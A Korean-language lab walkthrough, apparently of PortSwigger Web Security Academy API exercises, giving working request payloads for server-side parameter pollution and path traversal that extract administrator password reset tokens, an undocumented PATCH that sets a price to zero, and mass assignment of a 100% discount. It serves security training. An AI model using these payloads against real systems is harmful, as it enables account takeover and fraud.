
# LAB 
# 1. [초심자] 문서를 사용하여 API end point 활용 

> api 경로 이동을 통한 api문서 조회 후 api문서 기능 악용

- api 문서를 참조 할 수 있는 endpoint를 입력 해 본다.
```
/api
/swagger/index.html
/openapi.json
```
- 버프에서 테스트 시 /api/  아래 슬래시 까지 입력 해 줘야 조회 된다. 

- 이메일 업데이트 기능에서 api 호출 부분을 찾을 수 도 있다.
- 문서 검색은 해당 경로를 하나 씩 지워 보면서 조회 해보는 것
```
/api/user/wiener
/api/user/
/api/
```


- api 문서 예시

| Verb   | Endpoint                 | Parameters        | Response       |
| ------ | ------------------------ | ----------------- | -------------- |
| GET    | /user/[username: String] | { }               | 200 OK, User   |
| DELETE | /user/[username: String] | { }               | 200 OK, Result |
| PATCH  | /user/[username: String] | {"email": String} | 200 OK, User   |


- 위와 같은 문서에서 /user/carlos 로 조회 한다고 했을때 경로는
```
mainurl/api/user/carlos 
```

- 조회 나 삭제 등 url직접 접근 시 권한이 없을 수 있지만 api 문서에서 delete 를 클릭하고 요청을 보낼 수 도 있다.

# 2. [실무자] 쿼리 문자열의 서버 측 매개 변수 오염 활용

> api호출 시 파라미터에 %26, %23 사용하여 매개변수 추가를 활용한 악용

1. 비밀번호 찾기에서 파라미터에 잘못된 값을 넣어 응답 값을 확인한다. 
```
csrf=72PLBKviguGaCdE85OIhKBripc7mbreJ&username=administratorxs

// 결과
{"type":"ClientError","code":400,"error":"Invalid username."}
```

2. 파라미터 추가 시도 해본다. 
	그냥 &x=y 는 무시처리 됐지만  %26으로 하니 username으로 인식 되지 않고 파라미터로 인식 된다. 내부 API가 별도의 파라미터로 인식한것.
```
csrf=72PLBKviguGaCdE85OIhKBripc7mbreJ&username=administrator%26x=y

// 결과
{"error": "Parameter is not supported."}
```

3. 비밀번호 찾기에서 url파라미터에 \# 또는 %23을 추가 해 본다.
	Field 라는 파라미터가 서버에서 측에서 받는다는 것을 알 수 있다. 
```
csrf=72PLBKviguGaCdE85OIhKBripc7mbreJ&username=administrator%23

// 결과 값
{"error": "Field not specified."}
```

4.  파라미터로 field를 던져본다.
	field값을 인식함을 알 수 있다.
```
csrf=72PLBKviguGaCdE85OIhKBripc7mbreJ&username=administrator%26field=x%23

{"type":"ClientError","code":400,"error":"Invalid field."}
```

5. field값 에 intruder로 내장된**Server-side variable names** 페이로드 리스트를 대입 해 본다.
	결과는 email 이라는 값이다. field 매개변수 값에 email사용가능하다.

6. javascript 파일들을 검토한다. `/static/js/forgotPassword.js`  파일을 확인 해보자
```
forgotPwdReady(() => {
    const queryString = window.location.search;
    const urlParams = new URLSearchParams(queryString);
    const resetToken = urlParams.get('reset-token');
    if (resetToken)
    {
        window.location.href = `/forgot-password?reset_token=${resetToken}`;
    }
    else
    {
        const forgotPasswordBtn = document.getElementById("forgot-password-btn");
        forgotPasswordBtn.addEventListener("click", displayMsg);
    }
});
```

- 비밀번호 재설정 엔드포인트에서 `reset_token`이라는 값이 있다. 

7. field에 reset_token이라는 값을 대입해 보자.
	reset_token을 획득했다.
```
csrf=72PLBKviguGaCdE85OIhKBripc7mbreJ&username=administrator%26field=reset_token%23

// 결과
{"result":"86nsvqjrup4ylujnvbjt7mzh5lzzcz7g","type":"reset_token"}
```

8. 앞서 js분석으로 알아낸 비밀번호 재설정 엔드포인트를 활용한다. 
	비밀번호 재설정 성공
```
https://mailnurl/forgot-password?reset_token=86nsvqjrup4ylujnvbjt7mzh5lzzcz7g

//결과
비밀번호재설정 화면 
```



# 3. [실무자] 사용되지 않는 API엔드포인트 찾기 및 활용

> PATCH 및 Content-Type 사용 하여 금액 변조

1. 제품 조회 url
```
/api/products/3/price
```

2. repeater, OPTIONS로 허용 메소드 확인 해보기 
```
//결과
HTTP/2 405 Method Not Allowed
Allow: GET, PATCH
Content-Type: application/json; charset=utf-8
X-Frame-Options: SAMEORIGIN
Content-Length: 20

"Method Not Allowed"
```

3. PATCH로 변경 후 전송 시도 
```
PATCH /api/products/1/price HTTP/2

// 결과
{"type":"ClientError","code":400,"error":"Only 'application/json' Content-Type is supported"}
```

4. Content-Type -> application/json 변경 시도
```
PATCH /api/products/1/price HTTP/2
Host: 0ab400ec0410e60780802b91007f00e5.web-security-academy.net
Cookie: session=Ge2dCN65xivsv8RzmDpqJnPEbncSgsYV
Sec-Ch-Ua: "Not_A Brand";v="8", "Chromium";v="120"
Sec-Ch-Ua-Mobile: ?0
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.6099.71 Safari/537.36
Sec-Ch-Ua-Platform: "macOS"
Accept: */*
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: cors
Sec-Fetch-Dest: empty
Referer: https://0ab400ec0410e60780802b91007f00e5.web-security-academy.net/product?productId=1
Accept-Encoding: gzip, deflate, br
Accept-Language: ko-KR,ko;q=0.9,en-US;q=0.8,en;q=0.7
Priority: u=1, i
Content-Type: application/json   => 삽입

// 결과
HTTP/2 500 Internal Server Error
Content-Length: 21

Internal Server Error
```

5.  application/json이므로 빈 json 객체를 본문에 넣어서 전송 
```
{}

// 결과

{"type":"ClientError","code":400,"error":"'price' parameter missing in body"}
```

6. error 를 참고해서 price 파라미터 추가 
```
{
	"price":0
}

// 결과
HTTP/2 200 OK
Content-Type: application/json; charset=utf-8
X-Frame-Options: SAMEORIGIN
Content-Length: 17

{"price":"$0.00"}
```

7. 다시 해당 상품페이지 접근하면 가격이 0원 되어 있음 !! 


# 4. [실무자] 대량 할당 취약점 악용 

> 숨겨진 Json 매개변수 찾는 취약점

1. 장바구니 조회하기 api 및 응답 json 
```
GET /api/checkout
->
{
	"chosen_discount":{
		"percentage":0
	},
	"chosen_products":[
		{
			"product_id":"1",
			"name":"Lightweight \"l33t\" Leather Jacket",
			"quantity":1,
			"item_price":133700
		}
	]
}
```

2. 주문하기 api 요청 
	장바구니 조회하기와 비슷한 json 구조이다.
```
POST /api/checkout 

{
	"chosen_products":[
		{
			"product_id":"1",
			"quantity":1
		}
	]
}
```

3. 주문하기 api요청에 "chosen_discount" 매개변수 추가
```
POST /api/checkout 

{
	"chosen_discount":{
	 "percentage":100
	},
	"chosen_products":[
		{
			"product_id":"1",
			"quantity":1
		}
	]
}
```


# 5. [전문가] REST URL에서 서버측 매개변수 오염 활용

> 서버측 매개변수 오염  + api 경로순회 사용  -> api정의로 이동 user 정보조회 url 확인 및 악용 

## 1.  비밀번호 찾기 기능에서 매개변수값에 다양한 요청을 보내, 서버측 요청의 url경로에 배치되는지 확인한다. 

- %23의 결과 "Invalid route"(잘못된 경로) 
    2가지의 가능성을 시사한다. 
	1. 서버측 요청 url에  해당 값이 삽입
	2. # 이 동작해서 일부 후행 경로가 잘림
```
// 기본 값 
POST /forgot-password

csrf=hqHpJFf4gjuSNg7stbFSCdLhOHqcIfAI&username=administrator

// & 
csrf=hqHpJFf4gjuSNg7stbFSCdLhOHqcIfAI&username=administrator&x=y
-> 그냥 무시 후 정상응답값 조회 

// %26
csrf=hqHpJFf4gjuSNg7stbFSCdLhOHqcIfAI&username=administrator%26x=y
-> username파라미터 값으로  &x=y값이 들어감

// %23 
csrf=hqHpJFf4gjuSNg7stbFSCdLhOHqcIfAI&username=administrator%23
->
{
  "type": "error",
  "result": "Invalid route. Please refer to the API definition"
}
```

## 2. ./ 경로이동 시도 

1. 서버측 경로에 삽입 되므로 api 경로 이동을 시도 
	 - 삽입 시 정상응답이 나오는 것으로 보아 경로이동이 가능 확인
```
// 경로이동 시도
csrf=hqHpJFf4gjuSNg7stbFSCdLhOHqcIfAI&username=./administrator

-> 정상 응답 
```

2. 더 상위로 이동 시도 
	- ../../../../  는 not found라고 표시된다. 이는 api루트 경로를 벗어나는 것을 의미한다.
```
csrf=hqHpJFf4gjuSNg7stbFSCdLhOHqcIfAI&username=../administrator
->
HTTP/2 404 Not Found
...
{
  "type": "error",
  "result": "Invalid route. Please refer to the API definition"
}

// 더 상위로 이동 
csrf=hqHpJFf4gjuSNg7stbFSCdLhOHqcIfAI&username=../../../../administrator
->
HTTP/2 500 Internal Server Error
...
{
  "error": "Unexpected response from API server:\n<html>\n<head>\n    <meta charset=\"UTF-8\">\n    <title>Not Found<\/title>\n<\/head>\n<body>\n    <h1>Not found<\/h1>\n    <p>The URL that you requested was not found.<\/p>\n<\/body>\n<\/html>\n"
}

```

 3. 이경로에서 일반적인  API 파일 경로 접근을 시도해 본다. 
	- openapi.json 접근 시도 
	- /api/internal/v1/users/{username}/field/{field}\ 해당 url이 user의 정보를 조회 할 것으로 유추할 수 있다.
	- 따라서 username 조회 시 field 경로 및 매개변수를 사용할 수 있다.
```
csrf=sPAzGOYmhtSpLKjnNPQAzH7T6NDk8Fu6&username=../../../../openapi.json%23

-> 
{
  "error": 
  "Unexpected response from API server:\n{\n  \"openapi\": \"3.0.0\",\n   \"info\": {\n    \"title\": \"User API\",\n    \"version\": \"2.0.0\"\n  },\n  \"paths\": {\n    \"/api/internal/v1/users/{username}/field/{field}\": {\n      \"get\": {\n        \"tags\": [\n          \"users\"\n        ],\n        \"summary\": \"Find user by username\",\n        \"description\": \"API Version 1\",\n        \"parameters\": [\n          {\n            \"name\": \"username\",\n            \"in\": \"path\",\n            \"description\": \"Username\",\n            \"required\": true,\n            \"schema\": {\n        ..."
}
```

## 3. field 경로 추가 

1. field 경로를 추가 후 임의 값을 넣어본다. 
```
csrf=Qbf3ceD5UaLhPIPwfcvANfWzkXv1lklz&username=administrator/field/test%23

->
HTTP/2 400 Bad Request

{
  "type": "error",
  "result": "This version of API only supports the email field for security reasons"
}
```

2. 파라미터에 email 추가해본다. 
```
csrf=Qbf3ceD5UaLhPIPwfcvANfWzkXv1lklz&username=administrator/field/email%23
-> 정상 응답값
```

3. proxy-http history 에서 forgotPassword.js를 본다. 
	- passwordResetToken 이 존재한다. 
```
if (resetToken)
    {
        window.location.href = `/forgot-password?passwordResetToken=${resetToken}`;
    }
```

4. 파라미터에 passwordResetToken을 던져본다.
	- "This version" 에서는 email만 지원한다고 한다.
```
csrf=Qbf3ceD5UaLhPIPwfcvANfWzkXv1lklz&username=administrator/field/passwordResetToken%23

-> 
{
  "type": "error",
  "result": "This version of API only supports the email field for security reasons"
}
```

5. version 변경을 시도 해 본다. 
	- /api/internal/v1/users/{username}/field/{field}\ api정의 url을 참고해 버전 변경 시도
```
// v1
csrf=Qbf3ceD5UaLhPIPwfcvANfWzkXv1lklz&username=../../v1/users/administrator/field/passwordResetToken%23

-> 
{
  "type": "passwordResetToken",
  "result": "gvmstlgkf2jjfg3mw7ybmiwulughfpw7"
}

// v2 
{
  "type": "error",
  "result": "This version of API only supports the email field for security reasons"
}

// v3
{
  "type": "error",
  "result": "Invalid route. Please refer to the API definition"
}
```

6. 결론적으로 해당 유저의 field별 정보를 가져오는 api를 사용해서 passwordResetToken의 정보를 가져오는 것을 성공했다. 

## 4. ResetToken을 사용하여 비밀번호 변경 접근

1. forgotPassword.js
```
if (resetToken)
    {
        window.location.href = `/forgot-password?passwordResetToken=${resetToken}`;
    }
```

2. 패스워드 재설정 url접근 
```
GET /forgot-password?passwordResetToken=gvmstlgkf2jjfg3mw7ybmiwulughfpw7

> 패스워드 재설정 페이지 접근
```